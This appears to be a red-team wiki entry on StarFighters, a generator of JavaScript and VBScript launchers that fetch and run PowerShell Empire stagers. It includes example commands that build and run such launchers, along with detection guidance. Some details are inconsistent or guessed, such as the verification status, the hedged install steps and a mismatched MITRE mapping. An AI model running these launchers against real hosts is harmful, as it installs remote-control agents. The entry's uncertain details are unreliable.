---
id: 65b7c5c7-ec6a-4c91-b364-f383eb43f402
type: tool
verified: true
created_at: '2019-08-28T21:17:20.949814+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - post-exploitation
  - empire
  - launcher
  - javascript
  - vbscript
url: 'https://github.com/BC-SECURITY/StarFighters'
validated: true
---

# StarFighters

**Status**: Unverified

## Overview

StarFighters is a utility for generating JavaScript and VBScript-based launchers for PowerShell Empire agents. It enables red teams to deploy Empire stagers in environments with restricted PowerShell execution by wrapping the payload in alternative scripting languages, improving evasion against endpoint detection tools.

## Description

StarFighters integrates with PowerShell Empire, a post-exploitation framework, to create stealthy launchers. These launchers download and execute Empire stagers over HTTP/HTTPS, supporting scenarios like phishing deliveries or lateral movement where direct PowerShell use is logged or blocked. Commonly used in Windows domains for initial agent deployment.

## Features

- Feature 1: Generates obfuscated JavaScript launchers compatible with IE/Edge for web-based delivery.
- Feature 2: Creates VBScript launchers for execution via cscript/wscript, ideal for file-based drops.
- Feature 3: Supports custom stager URLs and basic encoding to reduce signatures.
- Feature 4: Lightweight and standalone executable, no dependencies beyond Windows Script Host.

## Installation

### Requirements

- Windows OS (XP or later)
- PowerShell Empire server running for stager hosting
- .NET Framework 2.0+ (for executable)

### Install Commands

```powershell
# Download from GitHub (assuming repo availability)
Invoke-WebRequest -Uri "https://github.com/BC-SECURITY/StarFighters/releases/download/v1.0/StarFighters.exe" -OutFile "StarFighters.exe"

# Or clone and build if source available
# git clone https://github.com/BC-SECURITY/StarFighters.git
# cd StarFighters
# # Build instructions per repo
```

On Kali/Ubuntu (for development):
```bash
apt update && apt install -y git mono-complete
git clone https://github.com/BC-SECURITY/StarFighters.git
# Build with Mono if C# source
```

## Basic Usage

```powershell
StarFighters.exe --help
```

### Common Options

| Option | Description |
|--------|-------------|
| -l, --launcher | Type of launcher (js or vbs) |
| -o, --output | Output file path |
| -s, --stager | Empire stager URL |
| -h, --help | Show help message |
| -v, --verbose | Enable verbose logging |

## Examples

### Example 1: Basic Usage

Generate a JS launcher:
```powershell
StarFighters.exe -l js -o launcher.js -s http://192.168.1.100:80/stager.ps1
```
See [[commands/starfighters-generate-js-launcher]] for details.

### Example 2: Advanced Usage

Generate and launch a VBS agent:
```cmd
StarFighters.exe -l vbs -o agent.vbs -s https://empire-server/stager.ps1
cscript //nologo agent.vbs
```
See [[commands/starfighters-generate-vbs-launcher]] and [[commands/starfighters-launch-agent]].

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] PowerShell
- [[Process Injection]] Visual Basic
- [[Remote File Copy]] Ingress Tool Transfer

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Privilege Escalation
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Detection method 1: Monitor for cscript/wscript spawning PowerShell processes with network activity to C2 ports.
- Detection method 2: Signature-based detection of generated JS/VBS patterns downloading .ps1 files.
- Detection method 3: PowerShell logging (Module/ScriptBlock) for Empire stager execution; AMSI scans for obfuscated payloads.
- Detection method 4: Network logs showing HTTP requests to known Empire stager paths.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/PowerShell-Empire]]
- [[tools/Covenant]]
- [[tools/Sliver]]

## References

- Official GitHub: https://github.com/BC-SECURITY/StarFighters
- PowerShell Empire Documentation: https://bc-security.gitbook.io/empire-wiki
- Related: Empire Launcher Techniques in Red Team Infrastructure Wiki
